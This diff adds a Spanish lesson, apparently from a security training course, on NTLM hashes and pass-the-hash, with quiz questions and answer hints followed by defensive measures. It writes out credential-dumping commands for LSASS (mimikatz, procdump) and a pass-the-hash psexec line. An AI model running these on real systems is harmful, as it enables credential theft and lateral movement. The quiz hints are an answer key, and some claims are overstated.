@@ -1,0 +1,74 @@
+---
+index: 3
+title: "NTLM: el hashespecial de Windows"
+questions:
+  - id: password-attacks-t03-q01
+    prompt: "¿Qué es un hash NTLM y por qué se puede robar de la memoria de un Windows (LSASS) sin que la contraseña esté ahí en claro?"
+    hint: "NTLM = MD4 del UTF-16LE de la contraseña: Windows lo guarda/cacha para autenticar y el derivado ES suficiente para autenticar"
+    kind: text
+  - id: password-attacks-t03-q02
+    prompt: "¿Cómo se llama la técnica que usa el propio hash NTLM robado para autenticarse SIN conocer la contraseña?"
+    hint: "Pass-the-hash (PtH) — mimikatz 'sekurlsa::pth' o Impacket psexec.py -hashes"
+    kind: text
+  - id: password-attacks-t03-q03
+    prompt: "¿Qué herramienta de Attify/Impacket ejecuta comandos en un Windows remoto dándole solo usuario + hash NTLM (sin contraseña)?"
+    hint: "impacket-psexec.py -hashes :NTLM usuario@host (la suite Impacket: psexec, wmiexec, smbexec)"
+    kind: text
+  - id: password-attacks-t03-q04
+    prompt: "¿Qué substituto moderno de NTLM hace pass-the-hash inútil porque usa tickets criptográficos y no derivados de contraseña?"
+    hint: "Kerberos (los TGT/TGS) — por eso los ataques modernos van a los tickets (kerberoasting) y a las credenciales en caché"
+    kind: text
+---
+
+## Por qué NTLM manda en los engagements de Windows
+
+Windows no guarda tu contraseña: guarda `NTLM hash = MD4(UTF-16LE(
+contraseña))`. Y el protocolo NTLM autentica demostrando que conoces el
+hash — no la contraseña. Consecuencia práctica: quien roba el hash,
+entra. La cadena típica:
+
+```
+phishing → shell como usuario → mimikatz/ProcDump de LSASS
+→ hashes NTLM del usuario (y de cuentas/service en memoria)
+→ pass-the-hash a otros equipos → hash de admin de dominio → game over
+```
+
+## Robar los hashes
+
+```powershell
+# Con sesión admin en el objetivo (herramientas clásicas):
+mimikatz # sekurlsa::logonpasswords     # vuelca credenciales de LSASS
+
+# Sin mimikatz (OPSEC): dump de LSASS + crack offline:
+procdump -ma lsass.exe lsass.dmp
+# pypykatz lsass.dmp   → hashes NTLM en tu máquina
+```
+
+## Pass-the-hash en acción
+
+```bash
+# Impacket — SMB ejecutivo con solo el hash (LM vacío : NTLM):
+impacket-psexec.py -hashes :32ED87BDB5FDC5E9CBA88547376818D4 administrator@10.10.10.10
+
+# También: wmiexec.py, atexec.py, smbexec.py (misma sintaxis -hashes)
+```
+
+El hash autentica contra SMB, WMI, WinRM... La contraseña en claro solo
+la necesitas para crackear el hash OFFLINE (hashcat -m 1000) cuando
+quieres reutilizarla en otros sitios (portales, VPN, correo) donde no
+hay NTLM.
+
+## La defensa moderna
+
+- **Kerberos por defecto** en dominios sanos: los tickets no derivan de
+  un hash reutilizable de la misma forma (los ataques migraron a
+  kerberoasting/tickets, no a PtH).
+- **Credential Guard** (VBS): aísla LSASS en un enclave virtual —
+  mimikatz clásico ya no lee.
+- **LAPS**: contraseñas admin locales únicas por equipo y rotadas —
+  mata la reutilización que hace escalar PtH.
+- **No WDigest**, lsass protected process (`RunAsPPL`), y alertas de
+  "admin local usado en otro equipo".
+
+El room de privesc-windows y el de active-directory-ataque practican
+varios de estos pasos con labs; aquí queda la teoría que los une.
